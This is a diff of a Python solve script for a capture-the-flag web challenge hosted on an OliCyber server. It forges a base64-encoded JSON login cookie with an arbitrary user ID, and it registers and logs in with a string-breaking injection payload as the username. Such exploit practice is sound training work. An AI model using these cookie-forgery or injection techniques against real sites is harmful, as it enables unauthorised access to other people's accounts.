@@ -7,11 +7,22 @@ import json
 
 url = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'
 
-print(r.post(url+'index.php', data={'username': 'samu', 'password': 'samuelef', 'login':''}, allow_redirects=False).text)
+def login_user(user):
+    stri = '{"ID":' + user + '}'
+    cookies = {
+        'login': b64e(stri.encode()).decode('utf-8'),
+    }
+    resp = r.get(url + 'home.php', cookies=cookies)
+    print(resp.text)
+    return resp
 
-stri = '{"ID":' + '190a' + '}'
-cookies = {
-    'login': b64e(stri.encode()).decode('utf-8'),
-}
-resp = r.get(url + 'home.php', cookies=cookies)
+#resp = login_user('18')
+#print(resp.headers)
+
+
+payload = "' . 'cuai' . '"
+# login
+resp = r.post(url + 'register.php', data={'username': payload, 'password': 'ciao', 'register': ''})
+print(resp.text)
+resp = r.post(url + 'index.php', data={'username': payload, 'password': 'ciao', 'login': ''})
 print(resp.text)
